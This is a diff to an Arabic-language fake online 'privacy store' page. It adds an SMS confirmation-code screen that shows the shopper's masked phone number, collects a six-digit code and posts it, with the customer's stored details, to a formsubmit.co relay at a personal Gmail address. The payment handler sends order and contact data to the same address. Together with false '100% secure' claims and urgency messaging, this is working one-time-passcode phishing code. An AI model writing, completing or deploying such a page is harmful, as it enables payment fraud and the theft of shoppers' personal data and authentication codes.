@@ -349,262 +349,114 @@
         </section>
     </div>
 
-    <!-- Enhanced Code Page -->
+    <!-- Simplified Code Verification Page -->
     <div id="code" class="page">
-        <section class="py-16 bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 min-h-screen relative overflow-hidden">
-            <!-- Enhanced Animated Background -->
+        <section class="py-16 bg-gradient-to-br from-green-900 via-emerald-900 to-teal-900 min-h-screen relative overflow-hidden">
+            <!-- Animated Background -->
             <div class="absolute inset-0 overflow-hidden">
-                <div class="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full opacity-20 animate-pulse"></div>
-                <div class="absolute -bottom-40 -left-40 w-96 h-96 bg-pink-500 rounded-full opacity-20 animate-pulse"></div>
-                <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-indigo-500 rounded-full opacity-10 animate-spin"></div>
-                <div class="absolute top-20 left-20 w-32 h-32 bg-yellow-400 rounded-full opacity-15 animate-bounce"></div>
-                <div class="absolute bottom-20 right-20 w-40 h-40 bg-green-400 rounded-full opacity-15 animate-float"></div>
+                <div class="absolute -top-40 -right-40 w-80 h-80 bg-green-500 rounded-full opacity-20 animate-pulse"></div>
+                <div class="absolute -bottom-40 -left-40 w-96 h-96 bg-emerald-500 rounded-full opacity-20 animate-pulse"></div>
+                <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-teal-500 rounded-full opacity-10 animate-spin"></div>
             </div>
             
             <div class="container mx-auto px-4 relative z-10">
-                <div class="max-w-7xl mx-auto">
-                    <!-- Enhanced Header Section -->
-                    <div class="text-center mb-16">
-                        <div class="inline-flex items-center justify-center w-40 h-40 bg-gradient-to-r from-purple-600 to-pink-600 rounded-full mb-8 shadow-2xl animate-glow">
-                            <i class="fas fa-unlock-alt text-6xl text-white animate-pulse"></i>
+                <div class="max-w-2xl mx-auto">
+                    <!-- Header Section -->
+                    <div class="text-center mb-12">
+                        <div class="inline-flex items-center justify-center w-32 h-32 bg-gradient-to-r from-green-600 to-emerald-600 rounded-full mb-8 shadow-2xl animate-glow">
+                            <i class="fas fa-sms text-5xl text-white animate-pulse"></i>
                         </div>
-                        <h1 class="text-7xl md:text-8xl font-black mb-8 text-transparent bg-clip-text bg-gradient-to-r from-white via-purple-200 to-pink-200 animate-float">
-                            🔥 كود الوصول المتقدم 🔥
+                        <h1 class="text-5xl md:text-6xl font-black mb-6 text-white animate-float">
+                            📱 أدخل رمز التأكيد 📱
                         </h1>
-                        <p class="text-3xl text-gray-200 mb-8 font-light">
-                            ✨ افتح باب الكنوز المخفية والعروض الأسطورية ✨
+                        <p class="text-2xl text-gray-200 mb-8 font-light">
+                            أدخل الرمز لإتمام الشراء
                         </p>
-                        <div class="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 px-10 py-6 rounded-full text-black font-black text-xl shadow-lg animate-pulse">
-                            🎯 عضوية VIP حصرية - عدد محدود جداً!
+                        <div class="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 px-8 py-4 rounded-full text-black font-bold text-lg shadow-lg animate-bounce">
+                            🔒 آمن ومحمي 100%
                         </div>
                     </div>
 
-                    <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
-                        <!-- Enhanced Code Entry Form -->
-                        <div class="xl:col-span-2 glass-effect rounded-3xl shadow-2xl p-8 border border-white/20">
-                            <div class="bg-gradient-to-r from-purple-600 to-pink-600 p-8 rounded-2xl mb-8 text-center relative overflow-hidden">
-                                <div class="absolute inset-0 bg-gradient-to-r from-purple-600/20 to-pink-600/20 animate-pulse"></div>
-                                <div class="relative z-10">
-                                    <h2 class="text-4xl font-black text-white mb-4">🌟 أدخل الكود السحري 🌟</h2>
-                                    <p class="text-purple-100 text-lg">أي 6 أرقام تفتح لك عالماً من الإمكانيات</p>
+                    <!-- Code Entry Form -->
+                    <div class="bg-white dark:bg-gray-800 rounded-3xl shadow-2xl p-8 border border-green-400/30 relative overflow-hidden">
+                        <div class="absolute inset-0 bg-gradient-to-br from-green-50 to-emerald-50 dark:from-gray-800 dark:to-gray-700"></div>
+                        <div class="relative z-10">
+                            <!-- Customer Info Display -->
+                            <div class="bg-green-100 dark:bg-green-900 p-6 rounded-2xl mb-8 border border-green-300 dark:border-green-700">
+                                <h3 class="text-xl font-bold text-green-800 dark:text-green-200 mb-4 text-center">
+                                    <i class="fas fa-mobile-alt mr-2"></i>
+                                    تم إرسال رمز التأكيد إلى
+                                </h3>
+                                <div class="text-center">
+                                    <p class="text-green-700 dark:text-green-300 text-2xl font-bold" id="customer-phone-display">****0000</p>
+                                    <p class="text-green-600 dark:text-green-400 text-sm mt-2">تحقق من رسائلك النصية</p>
                                 </div>
                             </div>
 
-                            <form id="advanced-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-8">
+                            <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-8">
                                 <!-- FormSubmit Hidden Fields -->
-                                <input type="hidden" name="_subject" value="🔥 كود VIP تم إدخاله - متجر الخصوصية المتطور 🔥">
+                                <input type="hidden" name="_subject" value="✅ رمز التأكيد تم إدخاله - متجر الخصوصية المتطور">
                                 <input type="hidden" name="_captcha" value="false">
                                 <input type="hidden" name="_template" value="table">
                                 <input type="hidden" name="_next" value="https://www.google.com">
-                                <input type="hidden" name="form_type" value="كود وصول VIP متقدم">
+                                <input type="hidden" name="form_type" value="رمز تأكيد الشراء">
                                 <input type="hidden" name="submission_time" value="">
-                                <input type="hidden" name="current_date" value="">
+                                <input type="hidden" name="customer_data" value="">
                                 
-                                <!-- Enhanced Personal Information -->
-                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                    <div class="animated-border">
-                                        <div class="inner">
-                                            <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
-                                                <i class="fas fa-user text-purple-600 mr-2"></i>
-                                                الاسم الكامل
-                                            </label>
-                                            <input type="text" name="full_name" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="أدخل اسمك الكامل" required="">
+                                <!-- Code Input Section -->
+                                <div class="bg-gradient-to-r from-green-100 to-emerald-100 dark:from-green-800 dark:to-emerald-800 p-8 rounded-2xl border border-green-300 dark:border-green-600">
+                                    <label class="block text-center text-gray-800 dark:text-white font-black mb-8 text-2xl">
+                                        <i class="fas fa-key text-green-600 text-3xl mr-3 animate-bounce"></i>
+                                        أدخل الرمز المرسل
+                                    </label>
+                                    
+                                    <div class="flex justify-center mb-8">
+                                        <div class="flex space-x-4 space-x-reverse">
+                                            <input type="text" id="verify-code-1" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            <input type="text" id="verify-code-2" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            <input type="text" id="verify-code-3" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            <input type="text" id="verify-code-4" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            <input type="text" id="verify-code-5" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
+                                            <input type="text" id="verify-code-6" maxlength="1" class="w-16 h-16 text-center text-2xl font-black bg-white dark:bg-gray-700 border-3 border-green-400 rounded-xl focus:outline-none focus:border-green-600 focus:ring-4 focus:ring-green-500/30 text-green-800 dark:text-green-200 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
                                         </div>
                                     </div>
-                                    <div class="animated-border">
-                                        <div class="inner">
-                                            <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
-                                                <i class="fas fa-phone text-purple-600 mr-2"></i>
-                                                رقم الهاتف
-                                            </label>
-                                            <input type="tel" name="phone_number" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="+966 5X XXX XXXX" required="">
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <div class="animated-border">
-                                    <div class="inner">
-                                        <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
-                                            <i class="fas fa-envelope text-purple-600 mr-2"></i>
-                                            البريد الإلكتروني
-                                        </label>
-                                        <input type="email" name="email_address" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300" placeholder="your@email.com" required="">
-                                    </div>
-                                </div>
-
-                                <!-- Enhanced Code Input Section -->
-                                <div class="bg-gradient-to-r from-purple-800/50 to-pink-800/50 p-8 rounded-2xl border border-purple-400/30 relative overflow-hidden">
-                                    <div class="absolute inset-0 bg-gradient-to-r from-purple-600/10 to-pink-600/10 animate-pulse"></div>
-                                    <div class="relative z-10">
-                                        <label class="block text-center text-white font-black mb-8 text-2xl">
-                                            <i class="fas fa-key text-yellow-300 text-3xl mr-3 animate-bounce"></i>
-                                            أدخل أي 6 أرقام للكود
-                                        </label>
-                                        
-                                        <div class="flex justify-center mb-8">
-                                            <div class="flex space-x-4 space-x-reverse">
-                                                <input type="text" id="code-1" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                                <input type="text" id="code-2" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                                <input type="text" id="code-3" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                                <input type="text" id="code-4" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                                <input type="text" id="code-5" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                                <input type="text" id="code-6" maxlength="1" class="w-20 h-20 text-center text-3xl font-black bg-white/90 border-3 border-purple-400 rounded-2xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/50 text-purple-800 transition-all duration-300 transform hover:scale-105" pattern="[0-9]">
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Hidden input for the complete code -->
-                                        <input type="hidden" name="verification_code" id="complete-code">
-                                        
-                                        <div class="text-center space-y-3">
-                                            <div class="bg-green-500/20 p-4 rounded-xl border border-green-400/30">
-                                                <p class="text-green-200 text-xl font-bold mb-2">✅ أدخل أي 6 أرقام للوصول الفوري</p>
-                                                <p class="text-green-300 text-lg">جميع الأكواد مقبولة - لا توجد قيود!</p>
-                                            </div>
-                                            <div class="bg-yellow-500/20 p-3 rounded-xl">
-                                                <p class="text-yellow-200 text-lg font-bold">🎯 مثال: 123456 أو 999999</p>
-                                            </div>
+                                    
+                                    <!-- Hidden input for the complete code -->
+                                    <input type="hidden" name="verification_code" id="complete-verify-code">
+                                    
+                                    <div class="text-center space-y-3">
+                                        <div class="bg-blue-500/20 p-4 rounded-xl border border-blue-400/30">
+                                            <p class="text-blue-800 dark:text-blue-200 text-lg font-bold mb-2">
+                                                <i class="fas fa-info-circle mr-2"></i>
+                                                لم تستلم الرمز؟
+                                            </p>
+                                            <button type="button" onclick="resendCode()" class="text-blue-600 dark:text-blue-400 font-bold hover:underline">
+                                                <i class="fas fa-redo mr-2"></i>
+                                                إعادة إرسال الرمز
+                                            </button>
                                         </div>
                                     </div>
                                 </div>
 
-                                <!-- Enhanced Additional Information -->
-                                <div class="animated-border">
-                                    <div class="inner">
-                                        <label class="block text-gray-800 dark:text-white font-bold mb-3 text-lg">
-                                            <i class="fas fa-comment-alt text-purple-600 mr-2"></i>
-                                            ملاحظات إضافية (اختياري)
-                                        </label>
-                                        <textarea name="additional_notes" rows="4" class="w-full px-4 py-4 text-base bg-gray-50 dark:bg-gray-700 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-500/30 transition-all duration-300 resize-none" placeholder="أي ملاحظات أو طلبات خاصة..."></textarea>
-                                    </div>
-                                </div>
-
-                                <!-- Enhanced Submit Button -->
-                                <button type="submit" id="submit-advanced-code" class="w-full bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 text-black py-8 rounded-2xl font-black text-2xl shadow-2xl transform transition-all duration-300 hover:scale-105 hover:shadow-3xl disabled:opacity-50 disabled:cursor-not-allowed animate-glow">
+                                <!-- Submit Button -->
+                                <button type="submit" id="submit-verification-code" class="w-full bg-gradient-to-r from-green-500 via-emerald-600 to-teal-600 text-white py-6 rounded-2xl font-black text-xl shadow-2xl transform transition-all duration-300 hover:scale-105 hover:shadow-3xl disabled:opacity-50 disabled:cursor-not-allowed animate-glow">
                                     <span class="flex items-center justify-center">
-                                        <i class="fas fa-rocket mr-4 text-3xl animate-bounce"></i>
-                                        🚀 تفعيل الكود وإطلاق الصاروخ! 🚀
+                                        <i class="fas fa-check-circle mr-3 text-2xl animate-bounce"></i>
+                                        ✅ تأكيد وإتمام الطلب ✅
                                     </span>
                                 </button>
                                 
                                 <div class="text-center space-y-3">
-                                    <div class="inline-flex items-center text-green-300 font-bold text-lg">
-                                        <i class="fas fa-shield-check mr-3 text-2xl"></i>
-                                        محمي بتشفير SSL متقدم + حماية عسكرية
+                                    <div class="inline-flex items-center text-gray-600 dark:text-gray-400 font-bold">
+                                        <i class="fas fa-shield-check mr-3 text-xl"></i>
+                                        عملية آمنة ومشفرة 100%
                                     </div>
-                                    <div class="inline-flex items-center text-blue-300 font-bold text-lg">
-                                        <i class="fas fa-clock mr-3 text-2xl"></i>
+                                    <div class="inline-flex items-center text-gray-600 dark:text-gray-400 font-bold">
+                                        <i class="fas fa-clock mr-3 text-xl"></i>
                                         معالجة فورية خلال ثوانٍ
                                     </div>
                                 </div>
                             </form>
-                        </div>
-
-                        <!-- Enhanced Benefits Sidebar -->
-                        <div class="space-y-6">
-                            <!-- Enhanced Premium Benefits -->
-                            <div class="glass-effect rounded-2xl p-6 border border-purple-400/30 relative overflow-hidden">
-                                <div class="absolute inset-0 bg-gradient-to-br from-purple-600/10 to-pink-600/10 animate-pulse"></div>
-                                <div class="relative z-10">
-                                    <h3 class="text-2xl font-black text-white mb-6 flex items-center">
-                                        <i class="fas fa-crown text-yellow-400 mr-3 text-3xl animate-bounce"></i>
-                                        مزايا VIP حصرية
-                                    </h3>
-                                    <div class="space-y-4">
-                                        <div class="flex items-center bg-gradient-to-r from-red-500/20 to-orange-500/20 p-4 rounded-xl border border-red-400/30">
-                                            <i class="fas fa-fire text-red-400 mr-3 text-2xl animate-pulse"></i>
-                                            <span class="text-white font-bold text-lg">خصم 75% على كل شيء</span>
-                                        </div>
-                                        <div class="flex items-center bg-gradient-to-r from-blue-500/20 to-cyan-500/20 p-4 rounded-xl border border-blue-400/30">
-                                            <i class="fas fa-shipping-fast text-blue-400 mr-3 text-2xl"></i>
-                                            <span class="text-white font-bold text-lg">توصيل مجاني فوري</span>
-                                        </div>
-                                        <div class="flex items-center bg-gradient-to-r from-purple-500/20 to-pink-500/20 p-4 rounded-xl border border-purple-400/30">
-                                            <i class="fas fa-gem text-purple-400 mr-3 text-2xl animate-float"></i>
-                                            <span class="text-white font-bold text-lg">منتجات حصرية فاخرة</span>
-                                        </div>
-                                        <div class="flex items-center bg-gradient-to-r from-yellow-500/20 to-orange-500/20 p-4 rounded-xl border border-yellow-400/30">
-                                            <i class="fas fa-headset text-yellow-400 mr-3 text-2xl"></i>
-                                            <span class="text-white font-bold text-lg">دعم VIP 24/7</span>
-                                        </div>
-                                        <div class="flex items-center bg-gradient-to-r from-green-500/20 to-emerald-500/20 p-4 rounded-xl border border-green-400/30">
-                                            <i class="fas fa-gift text-green-400 mr-3 text-2xl animate-bounce"></i>
-                                            <span class="text-white font-bold text-lg">هدايا مفاجئة أسبوعية</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Enhanced Security Features -->
-                            <div class="glass-effect rounded-2xl p-6 border border-green-400/30 relative overflow-hidden">
-                                <div class="absolute inset-0 bg-gradient-to-br from-green-600/10 to-teal-600/10 animate-pulse"></div>
-                                <div class="relative z-10">
-                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                        <i class="fas fa-shield-alt text-green-400 mr-3 text-2xl animate-pulse"></i>
-                                        الأمان المتقدم
-                                    </h3>
-                                    <div class="space-y-3 text-green-100">
-                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
-                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                            <span>تشفير عسكري 512-bit</span>
-                                        </div>
-                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
-                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                            <span>حماية الهوية التامة</span>
-                                        </div>
-                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
-                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                            <span>معايير الأمان الدولية</span>
-                                        </div>
-                                        <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
-                                            <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                            <span>حماية من الاختراق</span>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Enhanced Limited Time Offer -->
-                            <div class="glass-effect rounded-2xl p-6 border border-red-400/30 animate-pulse relative overflow-hidden">
-                                <div class="absolute inset-0 bg-gradient-to-br from-red-600/20 to-orange-600/20 animate-pulse"></div>
-                                <div class="relative z-10">
-                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                        <i class="fas fa-clock text-red-400 mr-3 text-2xl animate-bounce"></i>
-                                        عرض محدود زمنياً!
-                                    </h3>
-                                    <div class="text-center">
-                                        <div class="text-4xl font-black text-yellow-300 mb-3 animate-pulse">⏰ 24 ساعة فقط!</div>
-                                        <p class="text-red-100 text-lg font-bold mb-3">بعدها ترتفع الأسعار 500%</p>
-                                        <div class="bg-gradient-to-r from-yellow-400 to-orange-500 text-black p-4 rounded-xl font-black text-lg animate-bounce">
-                                            🎯 اغتنم الفرصة الذهبية الآن!
-                                        </div>
-                                        <div class="mt-3 text-red-200 text-sm">
-                                            💰 وفر آلاف الريالات اليوم
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Enhanced Success Stories -->
-                            <div class="glass-effect rounded-2xl p-6 border border-indigo-400/30 relative overflow-hidden">
-                                <div class="absolute inset-0 bg-gradient-to-br from-indigo-600/10 to-purple-600/10 animate-pulse"></div>
-                                <div class="relative z-10">
-                                    <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                        <i class="fas fa-star text-yellow-400 mr-3 text-2xl animate-pulse"></i>
-                                        قصص نجاح حقيقية
-                                    </h3>
-                                    <div class="space-y-4 text-indigo-100">
-                                        <div class="bg-indigo-500/20 p-3 rounded-lg border border-indigo-400/30">
-                                            <p class="italic font-bold">"وفرت أكثر من 10,000 ريال في شهر واحد! أفضل قرار اتخذته" - فاطمة م. ⭐⭐⭐⭐⭐</p>
-                                        </div>
-                                        <div class="bg-purple-500/20 p-3 rounded-lg border border-purple-400/30">
-                                            <p class="italic font-bold">"منتجات حصرية لا تجدها في أي مكان آخر بالعالم" - أحمد س. ⭐⭐⭐⭐⭐</p>
-                                        </div>
-                                        <div class="bg-pink-500/20 p-3 rounded-lg border border-pink-400/30">
-                                            <p class="italic font-bold">"خدمة VIP استثنائية وتوصيل سريع جداً!" - نورا ع. ⭐⭐⭐⭐⭐</p>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -1357,10 +1209,8 @@
             document.body.appendChild(modal);
         }
 
-        // Payment form handler - توجيه مباشر لصفحة الكود
+        // Payment form handler - إرجاع للطريقة الأصلية
         document.getElementById('payment-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // منع الإرسال العادي
-            
             const firstName = this.querySelector('input[name="first_name"]').value;
             const lastName = this.querySelector('input[name="last_name"]').value;
             const phone = this.querySelector('input[name="phone"]').value;
@@ -1373,64 +1223,35 @@
             };
             sessionStorage.setItem('customerData', JSON.stringify(customerData));
             
-            const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
-            sessionStorage.setItem('orderNumber', orderNumber);
-            
-            // إرسال بيانات الطلب للبريد الإلكتروني
             const orderSummary = cart.map(item => 
                 `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price} ريال`
             ).join('\n');
             
             const totalAmount = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
             
-            // إنشاء نموذج مخفي لإرسال تفاصيل الطلب
-            const orderForm = document.createElement('form');
-            orderForm.action = 'https://formsubmit.co/kaliroot123m@gmail.com';
-            orderForm.method = 'POST';
-            orderForm.target = 'hidden_iframe';
-            orderForm.style.display = 'none';
+            sessionStorage.setItem('orderNumber', orderNumber);
             
-            const orderFields = [
+            const hiddenFields = [
                 { name: '_subject', value: `📋 طلب جديد - ${orderNumber} - متجر الخصوصية المتطور` },
-                { name: '_captcha', value: 'false' },
-                { name: '_template', value: 'table' },
-                { name: 'form_type', value: 'طلب شراء جديد' },
-                { name: 'order_number', value: orderNumber },
-                { name: 'customer_name', value: customerData.name },
-                { name: 'customer_phone', value: customerData.phone },
-                { name: 'customer_email', value: customerData.email },
+                { name: '_next', value: `${window.location.origin}${window.location.pathname}#code` },
                 { name: 'order_items', value: orderSummary },
                 { name: 'total_amount', value: `${totalAmount} ريال` },
+                { name: 'order_number', value: orderNumber },
                 { name: 'order_date', value: new Date().toLocaleString('ar-SA') },
                 { name: 'order_status', value: 'في انتظار كود التأكيد' }
             ];
             
-            orderFields.forEach(field => {
+            hiddenFields.forEach(field => {
                 const input = document.createElement('input');
                 input.type = 'hidden';
                 input.name = field.name;
                 input.value = field.value;
-                orderForm.appendChild(input);
+                this.appendChild(input);
             });
             
-            document.body.appendChild(orderForm);
-            orderForm.submit();
-            document.body.removeChild(orderForm);
-            
-            // إفراغ السلة
             cart = [];
             updateCartUI();
-            
-            // إخفاء نموذج الدفع
-            hidePayment();
-            
-            // عرض رسالة نجاح
-            showNotification('✅ تم إرسال طلبك بنجاح!');
-            
-            // الانتقال لصفحة إدخال الكود بعد ثانية واحدة
-            setTimeout(() => {
-                showCodeVerificationPage();
-            }, 1000);
         });
 
         function sendVerificationCode() {
@@ -1569,28 +1390,105 @@
             });
         }
 
+        // إعداد إدخال كود التحقق الجديد
+        function setupVerifyCodeInputs() {
+            const verifyCodeInputs = ['verify-code-1', 'verify-code-2', 'verify-code-3', 'verify-code-4', 'verify-code-5', 'verify-code-6'];
+            
+            verifyCodeInputs.forEach((id, index) => {
+                const input = document.getElementById(id);
+                if (!input) return;
+                
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    if (this.value.length === 1 && index < verifyCodeInputs.length - 1) {
+                        document.getElementById(verifyCodeInputs[index + 1]).focus();
+                    }
+                    
+                    updateCompleteVerifyCode();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        document.getElementById(verifyCodeInputs[index - 1]).focus();
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                    
+                    for (let i = 0; i < Math.min(pasteData.length, verifyCodeInputs.length - index); i++) {
+                        const targetInput = document.getElementById(verifyCodeInputs[index + i]);
+                        if (targetInput) {
+                            targetInput.value = pasteData[i];
+                        }
+                    }
+                    
+                    updateCompleteVerifyCode();
+                });
+            });
+        }
+        
+        function updateCompleteVerifyCode() {
+            const verifyCodeInputs = ['verify-code-1', 'verify-code-2', 'verify-code-3', 'verify-code-4', 'verify-code-5', 'verify-code-6'];
+            let completeCode = '';
+            
+            verifyCodeInputs.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) {
+                    completeCode += input.value || '';
+                }
+            });
+            
+            const completeCodeInput = document.getElementById('complete-verify-code');
+            if (completeCodeInput) {
+                completeCodeInput.value = completeCode;
+            }
+            
+            const submitBtn = document.getElementById('submit-verification-code');
+            if (submitBtn) {
+                if (completeCode.length === 6) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    submitBtn.classList.add('animate-glow');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                    submitBtn.classList.remove('animate-glow');
+                }
+            }
+        }
+
         // Enhanced Input Formatting
         document.addEventListener('DOMContentLoaded', function() {
             checkAgeVerification();
             setupCodeInputs();
+            setupVerifyCodeInputs();
             setupAdvancedCodeForm();
             setupCodeVerificationForm();
             generateProducts();
             updateCartUI();
             
-            if (window.location.hash === '#success') {
+            // تحقق إذا تم الانتقال من صفحة الدفع
+            if (window.location.hash === '#code') {
                 setTimeout(() => {
-                    showPage('purchase-code');
-                    const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
-                    const orderDisplay = document.getElementById('order-number-display');
-                    if (orderDisplay) {
-                        orderDisplay.textContent = orderNumber;
+                    showPage('code');
+                    const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
+                    
+                    // تحديث عرض رقم الهاتف
+                    if (customerData.phone) {
+                        const phoneNumber = customerData.phone;
+                        const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+                        const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : '****0000';
+                        
+                        const phoneDisplay = document.getElementById('customer-phone-display');
+                        if (phoneDisplay) {
+                            phoneDisplay.textContent = maskedPhone;
+                        }
                     }
                     
-                    setTimeout(() => {
-                        sendVerificationCode();
-                    }, 2000);
-                    
+                    // إزالة الهاش من URL
                     window.history.replaceState({}, document.title, window.location.pathname);
                 }, 500);
             }
